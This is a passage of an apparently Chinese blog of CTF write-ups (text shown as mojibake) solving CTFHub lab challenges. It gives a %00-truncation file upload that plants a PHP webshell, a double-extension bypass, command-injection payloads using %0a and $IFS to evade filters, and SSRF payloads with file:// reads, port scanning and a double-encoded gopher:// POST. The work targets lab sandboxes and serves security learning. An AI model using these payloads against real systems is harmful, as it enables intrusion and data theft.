å¤±è´¥&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸²ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ å¤±è´¥&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>è¿™ä¸ªå‡½æ•°å°±æ˜¯æŠŠä¸Šä¼ æ–‡ä»¶æ”¾åˆ°<code>$des</code>çš„è·¯å¾„ä¸Šå¹¶ä¸”æ”¹äº†æ–‡ä»¶å</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®©åé¢çš„<code>rand()</code>å’Œ<code>date()</code>è¿è¡Œï¼Œæ‰€ä»¥å¯¹äºå˜é‡<code>road</code>ã€ä¹Ÿå°±æ˜¯å¼€å§‹è®²åˆ°çš„ã€‘ï¼Œå°±éœ€è¦åœ¨å®ƒåé¢åŠ ä¸Šä¸€ä¸ª%00æˆªæ–­åé¢çš„è¯­å¥</p>
<p>ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ª</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233456720.png" alt="image-20220731233456720"></p>
<p>å›¾ç‰‡æ­£å¸¸ä¸Šä¼ å°±å¯ä»¥ï¼Œè¿™å°±æ˜¯æŠŠå›¾ç‰‡å†…å®¹ä¸Šä¼ åˆ°1.phpæ–‡ä»¶ä¸­ï¼Œè¿™æ ·è™½ç„¶æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œä½†å®é™…ä¸Šï¼Œæˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªåä¸º1.phpçš„ä¸€å¥è¯æœ¨é©¬</p>
<p>ã€åå­—ä¸é‡è¦ï¼Œè™½ç„¶å›¾ç‰‡å’Œphpæ–‡ä»¶åä¸€æ ·ï¼Œè¿™é‡Œ1.phpæ˜¯éšä¾¿å–å¾—ï¼Œä¸»è¦èšå‰‘è¿æ¥çš„å°±æ˜¯å®ƒã€‘</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233716114.png"></p>
<p>ç”¨èšå‰‘è¿æ¥<code>url/upload/1.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"><a href="#10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€" class="headerlink" title="10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"></a>10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€</h2><p>è¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤phpåç¼€åï¼ŒåŒå†™phpä¸ºp<u>php</u>hpï¼Œè¿™æ ·å½“è¿‡æ»¤äº†__çš„phpï¼Œå‰©ä¸‹çš„ä»ç„¶æ˜¯phpï¼Œæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165549883.png" alt="image-20220731165549883"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165841829.png" alt="image-20220731165841829"></p>
<p>å¾—åˆ°flag</p>
<h2 id="11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"><a href="#11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ" class="headerlink" title="11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"></a>11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é“é¢˜</p>
<p>çœ‹åˆ°|ï¼Œ;ï¼Œ&amp;éƒ½è¢«è¿‡æ»¤äº†</p>
<p>é‚£ä¹ˆå¯ä»¥ç”¨%0aä¹Ÿæ˜¯æ¢è¡Œç¬¦ä»£æ›¿</p>
<p>ç©ºæ ¼ï¼Œ/ï¼Œcatï¼Œflagï¼Œctfhubï¼ˆæ²¡å…³ç³»ï¼‰</p>
<p>$IFSä»£æ›¿ç©ºæ ¼ï¼Œcatå¯ä»¥ç”¨moreä»£æ›¿ï¼Œ%09ä»£æ›¿TABé”®ï¼Œç”¨æ¥è¡¥å…¨flag</p>
<p><code>?ip=120.0.0.1%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215911504.png" alt="image-20220801215911504"></p>
<p>ç„¶å</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215930160.png" alt="image-20220801215930160"></p>
<p>åé¢å°±ç®€å•äº†</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
<p>å³é”®æŸ¥çœ‹æºç </p>
<p>å¾—åˆ°flag</p>
<h2 id="12-SSRF-å†…ç½‘è®¿é—®"><a href="#12-SSRF-å†…ç½‘è®¿é—®" class="headerlink" title="12.SSRF-å†…ç½‘è®¿é—®"></a>12.SSRF-å†…ç½‘è®¿é—®</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png" alt="image-20220802103603770"></p>
<p>æ‰€ä»¥æ„é€ payload</p>
<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶</h2><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><p>äº‹å®ä¸Šæ˜¯å…¶æ”¯æŒçš„åè®®ä¸å°è£…åè®®ã€‚è€Œå…¶æ”¯æŒçš„éƒ¨åˆ†åè®®æœ‰ï¼š</p>
<pre><code>    file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ

    http:// â€” è®¿é—® HTTP(s) ç½‘å€

    ftp:// â€” è®¿é—® FTP(s) URLs

    php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)
</code></pre>
<p>æ ¹æ®æç¤ºï¼Œflagåœ¨Webç›®å½•ä¸‹ï¼ŒWebç›®å½•ä¸€èˆ¬æ˜¯åœ¨<code>/var/www/html/</code>ä¸‹</p>
<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="14-SSRF-ç«¯å£æ‰«æ"><a href="#14-SSRF-ç«¯å£æ‰«æ" class="headerlink" title="14.SSRF-ç«¯å£æ‰«æ"></a>14.SSRF-ç«¯å£æ‰«æ</h2><p>ç«¯å£æ‰«æï¼Œé‚£å°±åˆ©ç”¨çˆ†ç ´ï¼Œä»8000åˆ°9000æ‰«ä¸€éï¼Œçœ‹çœ‹flagåœ¨å“ªä¸ªç«¯å£ä¸‹</p>
<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220802105640721.png" alt="image-20220802105640721"></p>
<p>çœ‹åˆ°é•¿åº¦ä¸åŒï¼Œæ‰“å¼€æŸ¥çœ‹å“åº”æ•°æ®åŒ…</p>
<p>å¾—åˆ°flag</p>
<h2 id="15-SSRF-POSTè¯·æ±‚"><a href="#15-SSRF-POSTè¯·æ±‚" class="headerlink" title="15.SSRF-POSTè¯·æ±‚"></a>15.SSRF-POSTè¯·æ±‚</h2><p><code>hintï¼šè¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</code></p>
<p>å¼€å§‹æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢</p>
<p>ç½‘ç«™ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬åœ¨å…¶åé¢åŠ ä¸Š<code>127.0.0.1/flag.php</code>çœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=127.0.0.1/</span>flag.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925221703912.png" alt="image-20220925221703912"></p>
<p>å‘ç°å‡ºç°äº†ä¸€ä¸ªè¾“å…¥æ¡†</p>
<p><code>F12</code>æŸ¥çœ‹æºç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å‘ç°äº†ä¸€ä¸ª<code>key</code>çš„å‚æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>æ˜¯ä¸å®šçš„å“ˆï¼Œä¸è¦å…¨<span class="built_in">copy</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬æŠŠ<code>key</code>å€¼è¾“å…¥æ¡†ä¸­è¯•è¯•</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>çœ‹æ¥åªèƒ½ä»æœ¬åœ°<code>127.0.0.1</code>è®¿é—®</p>
<p>åˆ©ç”¨<code>file://</code>ä¼ªåè®®ä»æœ¬åœ°æ–¹å¼è®¿é—®æ–‡ä»¶çœ‹çœ‹<code>index.php</code>æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure></div>

<p>å³é”®æŸ¥çœ‹ï¼Œ</p>
<p>å¾—åˆ°<code>index.php</code>æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ç›¸åŒæ–¹å¼çœ‹çœ‹<code>flag.php</code>æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®<code>flag.php</code>æœ€åçš„æç¤ºï¼Œ</p>
<p>å°è¯• <code>Gopher</code> åè®®å‘æœåŠ¡å™¨å‘é€ <code>POST</code> åŒ…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Gopheråè®®çš„æ ¼å¼:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IPæ•°æ®æµ</span><br></pre></td></tr></table></figure></div>

<p>å…ˆæ„é€  <code>Gopher</code>åè®®æ‰€éœ€çš„ <code>POST</code>è¯·æ±‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[åŒ…æ‹¬<span class="keyword">key</span>=,4ä¸ª]é•¿åº¦ä¸€è‡´</span></span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯è¿™é‡Œéœ€è¦å¯¹å…¶è¿›è¡Œä¸¤æ¬¡<code>url</code>ç¼–ç </p>
<p>æ ¹æ®<code>hint</code>ï¼Œè¯·æ±‚æœ‰<code>curl</code>åŠŸèƒ½</p>
<p>åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œé¦–å…ˆæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡ <code>URL</code>è§£ç ï¼Œ</p>
<p>å…¶æ¬¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåœ¨æ‰§è¡Œ<code>curl</code>åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ <code>URL</code>è§£ç </p>
<p>å› æ­¤éœ€è¦ä¸¤æ¬¡<code>url</code>ç¼–ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">`æ³¨`ï¼š</span><br><span class="line">åœ¨ç¬¬ä¸€æ¬¡ç¼–ç åçš„æ•°æ®ä¸­ï¼Œå°†`%<span class="number">0</span>A`å…¨éƒ¨æ›¿æ¢ä¸º`%<span class="number">0</span>D%<span class="number">0</span>A`ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸º Gopheråè®®åŒ…å«çš„è¯·æ±‚æ•°æ®åŒ…ä¸­ï¼Œå¯èƒ½åŒ…å«æœ‰`=`ã€`&amp;`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œ</span><br><span class="line">é¿å…ä¸æœåŠ¡å™¨è§£æä¼ å…¥çš„å‚æ•°é”®å€¼å¯¹æ··æ·†ï¼Œæ‰€ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œ URLç¼–ç ï¼Œè¿™æ ·æœåŠ¡ç«¯ä¼šæŠŠ`%`åçš„å­—èŠ‚å½“åšæ™®é€šå­—èŠ‚ã€‚</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925231951671.png" alt="image-20220925231951671"></p>
<p>ç„¶åç¬¬äºŒæ¬¡ç¼–ç </p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925232013164.png" alt="image-20220925232013164"></p>
<p>å¾—åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååˆå› ä¸º<code>flag.php</code>é‡Œæœ‰<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœç›´æ¥åœ¨è¾“å…¥æ¡†ï¼Œä¸Šä¼ POSTè¯·æ±‚åˆä¼šæ˜¾ç¤º</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>è¿™ä¸ªæƒ³ç»•è¿‡ï¼Œå°±åªæœ‰é€šè¿‡<code>index.php</code>çš„<code>curl</code>åŠŸèƒ½ï¼Œåˆ©ç”¨Gopheråè®®ä»<code>127.0.0.1</code>å‘ç›®æ ‡å‘é€<code>POST</code>è¯·æ±‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925232055769.png" alt="image-20220925232055769"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>HACK THE BOX</title>
    <url>/2022/09/23/Hackthebox/</url>
    <content><![CDATA[<p><strong>æƒ³å‡†å¤‡è¯•è¯•OSCPï¼Œ<code>HACK THE BOX</code>è¿˜è¡Œï¼Œæˆ‘å°±æŠŠå…è´¹çš„åšä¸€ä¸‹ï¼Œå­¦ä¹ ä¸€ä¸‹å·¥å…·çš„ä¸€ä¸‹ä½¿ç”¨ï¼Œä»¥åŠä¸€äº›é¢˜ç›®å’Œæ¦‚å¿µäº†è§£</strong></p>
<span id="more"></span>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œé¶åœºwp</title>
    <url>/2022/06/21/Gongfang-wp/</url>
    <content><![CDATA[<p><u><code>è¿™ä¸ªçº¿ä¸Šé¶åœºæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œè€Œä¸”éš¾åº¦åˆ†å¸ƒä¹Ÿå¥½ï¼Œå¾ˆä¼˜ç§€çš„çº¿ä¸Šé¶åœºï¼Œéå¸¸å€¼å¾—ä»”ç»†å­¦ä¹ ç ”ç©¶ä¸€ä¸‹</code></u></p>
<p><u><code>...åŠŸé˜²ä¸–ç•Œçªç„¶æ”¹ç‰ˆäº†ï¼ŒæŠŠé¢˜å¼„æˆä¸€å †äº†ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰éš¾åº¦ç³»æ•°ï¼Œä¸è¿‡ä¹Ÿæ–¹ä¾¿çœ‹çœ‹æœ‰å“ªäº›é€‚åˆéš¾åº¦çš„é¢˜ç›®åšä¸€åš</code></u></p>
<span id="more"></span>

